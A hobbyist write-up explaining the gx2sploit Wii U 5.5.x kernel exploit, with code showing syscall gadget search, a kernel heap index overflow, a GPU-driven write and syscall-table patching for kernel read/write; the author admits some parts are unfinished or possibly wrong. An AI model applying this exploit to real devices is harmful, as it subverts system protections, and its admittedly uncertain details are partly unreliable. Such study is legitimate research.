# gx2sploit kernel exploit - a (terrible) technical description
Trying to explain how this WiiU 5.5.X PowerPC Kernel Exploit work. The title directly refer to [this](https://gbatemp.net/threads/osdriver-kernel-exploit-a-technical-description.395444/)

## **What you need before starting:**

**DISCLAIMER**: I might be wrong, i have very little experience in Console hacking but this is my best attempt to explain it. All sources in the hypertext links + down below. (at the end)

Basic memory understanding. (virtual, physical memory etc..)

 **Quick reminder of some of the WiiU memory mappings (in the context of it being run under the Internet Browser**
 
[Virtual Address](http://wiiubrew.org/wiki/Cafe_OS#Virtual_Memory_Map) | [Physical Address](http://wiiubrew.org/wiki/Physical_Memory) | Size | Description
--------------- | ---------------- | ---- | -----------
**0x01000000** | **0x32000000** | **0x00800000** | [Loader](http://wiiubrew.org/wiki/Cafe_OS#Loader) and [system librairies](http://wiiubrew.org/wiki/Cafe_OS#Libraries)
**0x10000000** | **0x34000000** | **0x1C000000** (448 MB) | MEM2 for the InternetBrowser
**0xFF200000** | **0x1B800000** | **0x00080000** | PPC Kernel Work Area (kernel heap)
**0xFFFE0000** | **0xFFFE0000** | **0x00120000** | PPC Kernel .text + data

##### We will be using [this file](https://github.com/wiiudev/libwiiu/blob/master/kernel/gx2sploit/src/loader.c) (of the exploit) to explain stuff.

## Part 1: Dynamic linking (line 11 to 42)

In the WiiU, we use fonctions from **.rpl** files. They are basically the **.dll** of the WiiU.

*NOTE: most of the RPLs are acting like a proxy to the IOSU (Micro-kernel running on the ARM processor)*

We can get a handle to one of these library using this function (the first one):

```c
OSDynLoad_Acquire(const char *libname, uint32_t *handle); // @ 0x102a3b4 for FW 5.5.x 
OSDynLoad_FindExport(uint32_t lib_handle, bool is_pointed, const char *symbol, void *out_addr);
```

We use these like that to get a function: ([click me for a list of the lib + their symbols](http://wiiubrew.org/wiki/Cafe_OS#Libraries))

```c
uint32_t coreinit_handle = 0;
OSDynLoad_Acquire("coreinit.rpl", &coreinit_handle);

void (*OSExitThread)(int return_code);
OSDynLoad_FindExport(coreinit_handle, 0, "OSExitThread", &OSExitThread);

OSExitThread(1337);
```

## Part 2: The Bug + finding gagdets/constants (Line 42 to 87)
 ```c
uint32_t reg[] = {0x38003200, 0x44000002, 0x4E800020};
uint32_t (*Register)(char *driver_name, uint32_t name_length, void *buf1, void *buf2) = find_gadget(reg, 0xc, (uint32_t) __PPCExit);
uint32_t dereg[] = {0x38003300, 0x44000002, 0x4E800020};
uint32_t (*Deregister)(char *driver_name, uint32_t name_length) = find_gadget(dereg, 0xc, (uint32_t) __PPCExit);
uint32_t copyfrom[] = {0x38004700, 0x44000002, 0x4E800020};
uint32_t (*CopyFromSaveArea)(char *driver_name, uint32_t name_length, void *buffer, uint32_t length) = find_gadget(copyfrom, 0xc, (uint32_t) __PPCExit);
uint32_t copyto[] = {0x38004800, 0x44000002, 0x4E800020};
uint32_t (*CopyToSaveArea)(char *driver_name, uint32_t name_length, void *buffer, uint32_t length) = find_gadget(copyto, 0xc, (uint32_t) __PPCExit);

 ```
 
 It's very easy to understand. The function [**find_gadget**](https://github.com/wiiudev/libwiiu/blob/master/kernel/gx2sploit/src/loader.c#L173) will take a buffer (+ its size) and look in "all" the memory (you can also provide where to start the search from) to find the address of the exact same buffer.
 
 He're we are looking for syscalls (OSDriver Syscalls):
 
 ```assembly
    li r0, SYSCALL  # 0x3800XXXX
    sc              # 0x44000002
    blr             # 0x4E800020
 ```
 
 And they indeed are in the memory (address in the pic is wrong because of the IDA Loader):
 
 ![](https://i.imgur.com/QFPpI2d.png)
 
#### **We need to understand a few stuff before continuing:**

How the kernel heap works:

It basically uses three structs: ``OSDriver``, ``heap_block_t`` and ``heap_ctx_t``

```c
typedef struct _OSDriver
{
    char name[0x40];
    s32 unknown;
    s32 * save_area; // 0x1000 byte cross-process memory
    struct _OSDriver *next;
} OSDriver; // Size = 0x4c

typedef struct _heap_ctxt
{
    u32 base;
    u32 end;
    s32 first_index;
    s32 last_index;
    u32 unknown;
} heap_ctxt_t; // Size = 0x14

typedef struct _heap_block
{
    u32 addr;
    s32 size;
    s32 prev_index;
    s32 next_index;
} heap_block_t; // Size = 0x10
```

If we dump the kernel heap before the exploit we can see that the values at the very beginning are corresponding to a ``heap_ctxt_t``:

![](https://i.imgur.com/yJUhVHi.png)

So now it would make sense that at ``heap_ctxt_t->base + (index*0x10)`` we have a ``heap_block_t``

**Now we can understand and explain this part:**

```c
uint32_t *drvhax = OSAllocFromSystem(0x4c, 4);

uint32_t *metadata = (uint32_t*) (KERN_HEAP + METADATA_OFFSET + (0x02000000 * METADATA_SIZE));
metadata[0] = (uint32_t)drvhax;
metadata[1] = (uint32_t)-0x4c;
metadata[2] = (uint32_t)-1;
metadata[3] = (uint32_t)-1;
 ```

We allocate 0x4C bytes in the userspace, the size of an OSDriver. 
Then we setup a **heap_block_t**, called "metadata" here for obfuscation i presume. So we basically have:

```c
heap_block_t *block = (heap_block_t*)(0xFF200000 + 0x14 + (0x02000000*0x10)); // = 0x1F200014 = MEM2 -> user RW-able address

block->addr = (u32)drvhax;
block->size = (u32)-0x4C;
block->prev_index = (s32)0xFFFFFFFF; // (-1) whatever, it's written by kernel
block->next_index = (s32)0xFFFFFFFF; // (-1) same
```

**A negative ``heap_block_t->size`` will tell kernel that the block is free !**

When the kernel wants to allocate memory, it will parse all of the heap blocks from ``first_index`` to ``last_index``. If it finds a heap_block of size `equal or greater than >=` needed, it returns the address from the `heap_block` structure: 
```c 
return heap_block_t->addr;
```

How it calculates the ``heap_block_t`` address is kind of funny:

```c
s32 heap_alloc(heap_ctx_t *heap, s32 size)
{
    
    s32 ret = 0;

    /* *** Sanity checks *** */
    
    /* *** Loops through all heap_block entries *** */
    
    s32 idx = heap->first_index;
    // 0x10 = size of heap_ctx_t | 0x14 = size of heap_block_t
    heap_block_t *block = (heap_block_t*)(heap + 0x14 + (idx * 0x10));
    if(abs(block->size) >= size)
    {
            ret = block->addr
    }
    
//  else increment index and continue until last_index then return error if we're still here

    /* *** More checks *** */
    
    return ret;
}
```

**?????? Wait let me see again ??????**

```c
heap_block_t *block = (heap_block_t*)(heap + 0x14 + (idx * 0x10));
```

Nice job Nintendo, another yet Integer Overflow. (if we can control the index, aka ``heap_ctx_t->first_index``)

Imagine we control the index and we set it to 0x02000000. When the kernel will allocate it will be like that:

```c
heap = 0xFF200000;
idx  = 0x02000000;
heap_block_t *block = (heap_block_t*)(heap + 0x14 + (idx * 0x10));

block = 0x1F200014; // User controlled address. It points into MEM2, if there's a valid block here it will use it.
```

**If we modify ``index`` aka ``heap_ctx_t->first_index``, we can redirect the next kernel allocation to our userspace controlled buffer.**

**We just need to write the byte 0x02 at 0xFF200008 and we're done with the exploit basically**


# Part 3: The ROP Chain  (84 to 124)

**The main goal of the ROP Chain is to write into the Kernel Heap and modify ``heap_ctx_t->first_index``**

**I highly recommend to skip this Part, it's garbage and will be updated once i've figured this out**


The ``0x1 | 0x8`` at the end of ``OSCreateThread`` is realtively easy to understand. It sets the affinity:

- 0x1 correspond the CPU, here it's CPU0 
- 0x8 correspond to the **Detached** flag

It creates a detached thread on CPU0. We do ROP since codegen is only mapped for CPU1. And we need CPU0 to use GX2 commands.

```c
// = the physical address of heap_ctx_t->first_index
uint32_t kpaddr = KERN_HEAP_PHYS + 8; // STARTID_OFFSET = 8
```

**Now we setup our ROP Chain in the stack, and basically the thread will write to the physical address defined by  ``kpaddr`` using raw GPU Commands that will modify a semaphore.**

We use ``GX2SetSemaphore + 0x2C`` so we can skip the ``EffectiveToPhysical`` translation. And it probably do something idk, please help lmao.

# Part 4: Patching the kernel (Line 126 to 143)

Our exploit scheme is:

- Find gadgets for the ROP
- Setup our metadata in MEM2
- Patch the ``first_index`` in the kernel heap
- Register an OSDriver. It will use our userspace memory because the first usable heap  block is in userspace.
- We can freely modify the OSDriver ``save_area`` since it's in userspace. We set it to the kernel syscall table.
- Use ``OSDriver_CopyToSaveArea`` to write our userspace buffer into the kernel syscall table.
- We now have kernel R/W, we can set the heap ``first_index`` back to 0 and modify the KERNEL_DRIVER_POINTER to a normal driver from the Kernel Heap.

Right now, our thread is over and the ``heap_ctx_t->first_index`` has been overwritten. (should be 0x02000000)
So as said before, if we allocate memory in the kernel heap, it will use our userspace ``heap_block``. If we register an OSDriver it will force the kernel to allocate 0x4c bytes for your ``OSDriver`` struct.

```c
OSDriver_Register("DRVHAX", 6, NULL, NULL);
```

Now [``drvhax``](https://github.com/wiiudev/libwiiu/blob/master/kernel/gx2sploit/src/loader.c#L61) should contain data of an OSDriver. And our heap_block (metadata) should be used. The size should now be 0x4c and the prev/next block address should be set.

We can just modify our driver save_area and make it point to the Kernel Syscall Table:

```c
// KERN_SYSCALL_TBL = 0xFFEAAE60 (in kernel .text)
drvhax[0x44/4] = KERN_SYSCALL_TBL + (0x34 * 4); // equivalent of (OSDriver *)drvhax->save_area = KERN_SYSCALL_TBL + (0x34 * 4);
```

Now we can patch the kernel using ``OSDriver_CopyToSaveArea``. We will install our ``kern_read/kern_write`` syscalls !

```c
uint32_t syscalls[2] = {KERN_CODE_READ, KERN_CODE_WRITE};
OSDriver_CopyToSaveArea("DRVHAX", 6, syscalls, 2 * sizeof(uint32_t));
```

We have now installed our syscalls, great. We need to fix the kernel now because new kernel allocations will probably fuck up:

```c
kern_write((void*)(KERN_HEAP + STARTID_OFFSET), 0); // We set "heap_ctx_t->first_index" back to 0.
kern_write((void*)KERN_DRVPTR, drvhax[0x48/4]);     // (OSDriver *)drvhax->next_drv;
```

**The last two patches are just mapping R-X memory as RW- elsewhere so we can exit the sandbox and start doing insane stuff, but this will be part of a next write-up**


# GG, Now we have Kernel R/W and we can get kernel code execution by adding our own syscalls.

.
.
.
.
.

**Coming next:** How do we exit the entrypoint and loads the HBL ? (haxchi/Internet Browser)

That was really long to type, there are probably a lot of typo and missing zero's in the hex values.
Message me about them so i can fix it.

#Source:

https://github.com/wiiudev/libwiiu/blob/master/kernel/gx2sploit/src/loader.c
https://github.com/plutooo/wiiu/tree/master/notes/ppc_kernel
http://wiiubrew.org/

/Exploits
/Cafe_OS
/Cafe_OS_Syscalls

And my own reverse-engineering:

Thanks for reading,
    NexoCube

